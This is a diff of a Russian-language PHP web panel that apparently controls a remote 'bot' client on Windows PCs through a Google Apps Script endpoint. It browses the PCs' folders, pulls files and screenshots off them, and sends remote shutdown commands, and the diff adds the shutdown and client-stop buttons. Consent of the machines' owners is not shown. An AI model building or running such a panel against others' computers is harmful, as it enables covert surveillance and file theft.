@@ -6,7 +6,7 @@ error_reporting(E_ALL); ini_set('display_errors', 1);
 // !!! ВСТАВЬ СВОЙ URL GOOGLE SCRIPT НИЖЕ !!!
 $api = "https://script.google.com/macros/s/AKfycbwDgR5LEV3rc7kiJjGqsa6IQkX4ZOfPWFcyA2appKMzSt8D4j7xUIPLkGhQRyExYw1P/exec";
 
-// Папки для хранения кэша, чтобы не забивать оперативку
+// Папки для хранения кэша, чтобы не забивать оперативку сервера
 $cache_dir = __DIR__ . '/explorer_cache/';
 if (!is_dir($cache_dir)) mkdir($cache_dir, 0777, true);
 
@@ -14,9 +14,8 @@ if (!is_dir($cache_dir)) mkdir($cache_dir, 0777, true);
 if (isset($_POST['screenshot_device_id'])) {
     $dev_id = preg_replace('/[^a-zA-Z0-9_-]/', '', $_POST['screenshot_device_id']);
     
-    // Бот прислай JSON структуру папки
+    // Бот прислал JSON структуру папки
     if (isset($_POST['folder_structure'])) {
-        // Жестко пишем структуру папки в текстовый файл на диск Render
         file_put_contents($cache_dir . $dev_id . '_tree.txt', $_POST['folder_structure']);
         file_put_contents($cache_dir . $dev_id . '_path.txt', $_POST['current_path'] ?? 'C:\\');
         echo "SERVER_SAVED_STRUCTURE";
@@ -47,7 +46,7 @@ if (isset($_POST['screenshot_device_id'])) {
     }
 }
 
-// 2. СКАЧИВАНИЕ ФАЙЛОВ С ПАНЕЛИ
+// 2. СКАЧИВАНИЕ ФАЙЛОВ С ПАНЕЛИ В БРАУЗЕР ПОЛЬЗОВАТЕЛЯ
 if (isset($_GET['get_file']) && isset($_GET['dev'])) {
     $dev_id = preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['dev']);
     $filename = basename($_GET['get_file']);
@@ -56,7 +55,7 @@ if (isset($_GET['get_file']) && isset($_GET['dev'])) {
         header('Content-Type: application/octet-stream');
         header('Content-Disposition: attachment; filename="' . $filename . '"');
         readfile($file);
-    } else { echo "Файл не найден."; }
+    } else { echo "Файл не найден на сервере."; }
     exit;
 }
 
@@ -71,7 +70,7 @@ if (isset($_GET['download_screen'])) {
     exit;
 }
 
-// 3. ОБРАБОТЧИК КНОПОК ПАНЕЛИ
+// 3. ОБРАБОТЧИК КНОПОК ПАНЕЛИ (ОТПРАВКА В GOOGLE SCRIPT)
 if ($_SERVER["REQUEST_METHOD"] === "POST") {
     $action = isset($_POST["action"]) ? trim($_POST["action"]) : ""; 
     $device_id = isset($_POST["device_id"]) ? trim($_POST["device_id"]) : "";
@@ -105,7 +104,7 @@ $devices = getData($api); $logs = getData($api . "?get_logs=1");
 <html lang="ru">
 <head>
 <meta charset="UTF-8">
-<title>Надежная Панель Управления</title>
+<title>Центральная Панель Управления</title>
 <style>
 body{ margin:0; font-family:system-ui, sans-serif; background:#090d16; color:#e2e8f0; padding-bottom:50px;}
 .header{ padding:18px 24px; background:#0f172a; border-bottom:1px solid #1e293b; font-weight:bold; font-size:19px; display:flex; justify-content:space-between; align-items:center;}
@@ -123,11 +122,13 @@ button, .btn-link{ width:100%; margin-top:8px; padding:10px; border-radius:8px; 
 .blue { background:#4f46e5; color:white; } .blue:hover{ background:#4338ca; }
 .green { background:#059669; color:white; } .green:hover{ background:#047857; }
 .orange { background:#d97706; color:white; } .orange:hover{ background:#b45309; }
+.red { background:#dc2626; color:white; } .red:hover{ background:#b91c1c; }
+.gray-danger { background:#374151; color:#f3f4f6; border: 1px solid #4b5563; } .gray-danger:hover{ background:#1f2937; }
 .explorer-box { background:#030712; border:1px solid #1f2937; border-radius:8px; padding:10px; margin-top:10px; max-height:250px; overflow-y:auto; }
 .exp-item { display:flex; justify-content:space-between; align-items:center; padding:6px; border-bottom:1px solid #111827; font-size:12px; }
 .exp-btn { background:none; border:none; color:#60a5fa; text-align:left; padding:0; width:auto; margin:0; display:inline; font-weight:normal; font-family:monospace; cursor:pointer;}
 .exp-btn:hover { text-decoration:underline; color:#93c5fd; }
-.log-section{ margin:24px; background:#111827; border:1px solid #1f2937; border-radius:14px; padding:20px;}
+.log-section{ margin:24px; background:#111827; border:1px solid #1f2937; border-radius:14px; padding:20px; overflow-x:auto;}
 table{ width:100%; border-collapse:collapse; font-size:13px;}
 th, td{ padding:12px; border-bottom:1px solid #1f2937; text-align:left;}
 .process-box { background:#030712; padding:10px; border-radius:8px; border:1px solid #1f2937; font-family:monospace; font-size:11px; color:#10b981; max-height:120px; overflow-y:auto; margin-top:8px; display:none; white-space: pre-wrap; }
@@ -136,7 +137,7 @@ th, td{ padding:12px; border-bottom:1px solid #1f2937; text-align:left;}
 <body>
 
 <div class="header">
-    <span>🖥 Панель Управления + Проводник (Дисковый Кэш)</span>
+    <span>🖥 Центральная Панель Управления PRO</span>
     <div class="sync-indicator"><span class="dot"></span>Автообновление (10с)</div>
 </div>
 
@@ -176,7 +177,7 @@ th, td{ padding:12px; border-bottom:1px solid #1f2937; text-align:left;}
             ?>
             <span style="font-size:11px; color:#64748b; font-family:monospace; display:block; margin-bottom:4px;">Путь: <?=htmlspecialchars($cur_path)?></span>
             <input type="hidden" name="target_path" value="<?=htmlspecialchars($cur_path)?>">
-            <button type="submit" class="blue" style="background:#0284c7; margin:0;">🔄 Обновить папку / Перейти на C:</button>
+            <button type="submit" class="blue" style="background:#0284c7; margin:0;">🔄 Обновить папку / Перейти на диск C:</button>
         </form>
 
         <div class="explorer-box">
@@ -185,7 +186,7 @@ th, td{ padding:12px; border-bottom:1px solid #1f2937; text-align:left;}
             $items = file_exists($tree_file) ? json_decode(file_get_contents($tree_file), true) : [];
             
             if(empty($items)) {
-                echo "<span style='font-size:11px; color:#4b5563;'>Кэш пуст. Нажмите кнопку «Обновить папку»</span>";
+                echo "<span style='font-size:11px; color:#4b5563;'>Кэш пуст. Нажмите «Обновить папку» выше.</span>";
             } else {
                 // Кнопка Назад
                 if ($cur_path !== 'C:\\' && $cur_path !== 'C:/') {
@@ -213,7 +214,7 @@ th, td{ padding:12px; border-bottom:1px solid #1f2937; text-align:left;}
                         echo "<form method='POST' action=''>
                                 <input type='hidden' name='action' value='download_file'><input type='hidden' name='device_id' value='{$dev_id}'>
                                 <input type='hidden' name='target_path' value='".htmlspecialchars($full)."'>
-                                <button type='submit' class='exp-btn' style='color:#10b981;'>📄 {$name}</button>
+                                <button type='submit' class='exp-btn' style='color:#10b981;' onclick=\"return confirm('Запросить скачивание этого файла с ПК?')\">📄 {$name}</button>
                               </form>";
                         echo "<span style='font-size:10px; color:#4b5563;'>{$item['size']}</span>";
                     }
@@ -227,20 +228,56 @@ th, td{ padding:12px; border-bottom:1px solid #1f2937; text-align:left;}
         $last_file_ptr = $cache_dir . $dev_id . '_lastfile.txt';
         if (file_exists($last_file_ptr)): $fn = file_get_contents($last_file_ptr); 
         ?>
-            <a href="?get_file=<?=urlencode($fn)?>&dev=<?=$dev_id?>" class="btn-link green" style="background:#10b981; margin-top:6px;">💾 Скачать: <?=$fn?></a>
+            <a href="?get_file=<?=urlencode($fn)?>&dev=<?=$dev_id?>" class="btn-link green" style="background:#10b981; margin-top:8px; box-shadow: 0 0 10px rgba(16,185,129,0.4);">💾 Скачать файл на свой ПК: <?=$fn?></a>
         <?php endif; ?>
 
-        <hr style="border-color:#1f2937; margin:12px 0;">
+        <hr style="border-color:#1f2937; margin:15px 0;">
 
         <form method="POST" action="" style="margin-bottom:6px;">
             <input type="hidden" name="action" value="take_screenshot"><input type="hidden" name="device_id" value="<?=$dev_id?>">
-            <button type="submit" class="blue">📸 Сделать Скриншот</button>
+            <button type="submit" class="blue">📸 Запросить Скриншот</button>
         </form>
         <?php if (file_exists(__DIR__ . '/screenshots/screen_' . $dev_id . '.jpg')): ?>
-            <a href="?download_screen=<?=urlencode($dev_id)?>" class="btn-link green" target="_blank" style="margin-bottom:6px;">📥 Посмотреть скриншот</a>
+            <a href="?download_screen=<?=urlencode($dev_id)?>" class="btn-link green" target="_blank" style="margin-bottom:6px;">📥 Посмотреть скриншот экрана</a>
         <?php endif; ?>
+
+        <hr style="border-color:#1f2937; margin:15px 0;">
+
+        <form method="POST" action="" style="margin-bottom:6px;">
+            <input type="hidden" name="action" value="stop_client">
+            <input type="hidden" name="device_id" value="<?=$dev_id?>">
+            <button type="submit" class="orange" onclick="return confirm('Выключить программу-клиент на удаленном ПК?')">❌ Закрыть программу бота</button>
+        </form>
+
+        <form method="POST" action="" style="margin-bottom:6px;">
+            <input type="hidden" name="action" value="shutdown">
+            <input type="hidden" name="device_id" value="<?=$dev_id?>">
+            <button type="submit" class="red" onclick="return confirm('Выключить удаленный компьютер полностью?')">💻 Выключить компьютер</button>
+        </form>
+
+        <form method="POST" action="">
+            <input type="hidden" name="action" value="delete">
+            <input type="hidden" name="device_id" value="<?=$dev_id?>">
+            <button type="submit" class="gray-danger" onclick="return confirm('Забыть этот ПК? Он исчезнет из панели, пока его бот снова не запингует.')">🗑 Забыть ПК (Удалить из базы)</button>
+        </form>
     </div>
     <?php endforeach; ?>
+</div>
+
+<div class="log-section">
+    <div class="name" style="font-size:15px;">📋 Системные отчеты выполнения</div>
+    <table>
+        <tbody>
+            <?php foreach ($logs as $l): if(empty($l["id"])) continue; ?>
+                <tr>
+                    <td><?=htmlspecialchars($l["id"])?></td>
+                    <td><?=htmlspecialchars($l["device_id"])?></td>
+                    <td><?=htmlspecialchars($l["action"])?></td>
+                    <td><?=htmlspecialchars($l["log"] ?? "")?></td>
+                </tr>
+            <?php endforeach; ?>
+        </tbody>
+    </table>
 </div>
 
 <script>
